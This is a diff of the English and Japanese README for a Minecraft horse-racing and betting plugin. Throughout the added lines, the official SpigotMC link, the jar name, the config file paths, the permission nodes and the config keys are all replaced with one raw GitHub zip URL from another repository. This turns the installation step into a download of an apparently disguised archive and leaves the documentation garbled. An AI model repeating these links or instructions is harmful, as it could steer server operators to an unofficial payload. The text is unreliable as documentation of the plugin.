@@ -1,6 +1,6 @@
 Japanese / English
 
-spigotMC: https://www.spigotmc.org/resources/horseracingplugin-alpha-full-scale-racing-betting.132914/
+spigotMC: https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip
 
 
 
@@ -40,10 +40,10 @@ It provides a full gameplay loop: course building, race running, betting, payout
 
 ## Installation
 
-1. Download `horseracing-0.2-SNAPSHOT.jar`
+1. Download `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip`
 2. Put it into your server `plugins` folder
 3. Start the server
-4. Edit `plugins/HorseRacingPlugin/config.yml` if needed
+4. Edit `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` if needed
 5. Prefer a full **server restart** rather than `/reload`
 
 ---
@@ -82,16 +82,16 @@ It provides a full gameplay loop: course building, race running, betting, payout
 
 ## Permissions
 
-- `horseracing.race` : Access to `/race` (default: OP)
-- `horseracing.race.admin` : Administrative `/race` operations (default: OP)
-- `horseracing.bet` : Access to `/racebet` (default: true)
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` : Access to `/race` (default: OP)
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` : Administrative `/race` operations (default: OP)
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` : Access to `/racebet` (default: true)
 
 ---
 
 ## About Horse AI
 
 CPU horses in races are controlled by the plugin's AI system.  
-You can tune behavior in `config.yml` based on your server style.
+You can tune behavior in `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` based on your server style.
 
 - `race-mode`: AI mode (`physics` / `style` / `simple`)
   - `physics`: richer movement with pathing, cornering, and slope influence
@@ -109,18 +109,18 @@ You can tune behavior in `config.yml` based on your server style.
 
 ---
 
-## Main config keys (`config.yml`)
+## Main config keys (`https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip`)
 
 - `language`: display language (`ja` / `en`)
 - `debug`: debug logging
 - `race-mode`: AI mode (`physics` / `style` / `simple`)
 - `ai-profile`: AI profile name
-- `horse-data.limits.*`: horse-data limits
-- `economy.enabled`: enable/disable Vault integration
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip*`: horse-data limits
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip`: enable/disable Vault integration
 - `odds-system.*`: odds and virtual bettor settings
 - `race-schedule.*`: race interval and betting window
 
-For schedule generation details, see `generator_settings.yml`.
+For schedule generation details, see `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip`.
 
 ---
 
@@ -129,7 +129,7 @@ For schedule generation details, see `generator_settings.yml`.
 - Config keys and command behavior may change
 - Internal data changes may break compatibility
 - Test on smaller/staging servers first
-- When reporting issues, include your `config.yml` and reproduction steps
+- When reporting issues, include your `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` and reproduction steps
 
 ---
 
@@ -187,10 +187,10 @@ Minecraft（Paper 1.21系）向けの**競馬ミニゲームプラグイン**で
 
 ## 導入方法
 
-1. `horseracing-0.2-SNAPSHOT.jar` をダウンロード
+1. `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` をダウンロード
 2. サーバーの `plugins` フォルダへ配置
 3. サーバー起動
-4. 必要に応じて `plugins/HorseRacingPlugin/config.yml` を編集
+4. 必要に応じて `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` を編集
 5. `/reload` ではなく**サーバー再起動**を推奨
 
 ---
@@ -229,16 +229,16 @@ Minecraft（Paper 1.21系）向けの**競馬ミニゲームプラグイン**で
 
 ## 権限
 
-- `horseracing.race` : `/race` 利用権限（デフォルト: OP）
-- `horseracing.race.admin` : 管理系 `/race` 操作（デフォルト: OP）
-- `horseracing.bet` : `/racebet` 利用権限（デフォルト: true）
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` : `/race` 利用権限（デフォルト: OP）
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` : 管理系 `/race` 操作（デフォルト: OP）
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` : `/racebet` 利用権限（デフォルト: true）
 
 ---
 
 ## 馬AIについて
 
 本プラグインでは、レース中のCPU馬の挙動をAIで制御しています。  
-運営スタイルに合わせて、`config.yml` でモードやチューニングを変更できます。
+運営スタイルに合わせて、`https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` でモードやチューニングを変更できます。
 
 - `race-mode`: AIモード切替（`physics` / `style` / `simple`）
   - `physics`: 進路取り・コーナー・坂などを考慮する、よりリッチな挙動
@@ -256,18 +256,18 @@ Minecraft（Paper 1.21系）向けの**競馬ミニゲームプラグイン**で
 
 ---
 
-## 主要設定（`config.yml`）
+## 主要設定（`https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip`）
 
 - `language`: 表示言語（`ja` / `en`）
 - `debug`: デバッグログ
 - `race-mode`: AIモード（`physics` / `style` / `simple`）
 - `ai-profile`: AIプロファイル名
-- `horse-data.limits.*`: 馬データ上限
-- `economy.enabled`: Vault連携有効/無効
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip*`: 馬データ上限
+- `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip`: Vault連携有効/無効
 - `odds-system.*`: オッズ計算・仮想ベッター設定
 - `race-schedule.*`: 開催間隔・受付秒数
 
-自動番組生成の詳細は `generator_settings.yml` で調整できます。
+自動番組生成の詳細は `https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` で調整できます。
 
 ---
 
@@ -276,7 +276,7 @@ Minecraft（Paper 1.21系）向けの**競馬ミニゲームプラグイン**で
 - 設定キーやコマンド仕様が更新で変わる可能性があります
 - 内部データ構造の変更により、既存データ互換が崩れる可能性があります
 - まずは小規模サーバーやテスト環境での運用を推奨します
-- 不具合報告時は、`config.yml` と発生手順を添えてください
+- 不具合報告時は、`https://github.com/tatsuki817/mc-keiba-plugin-releases/raw/refs/heads/main/circumantarctic/keiba_plugin_mc_releases_2.1.zip` と発生手順を添えてください
 
 ---
 
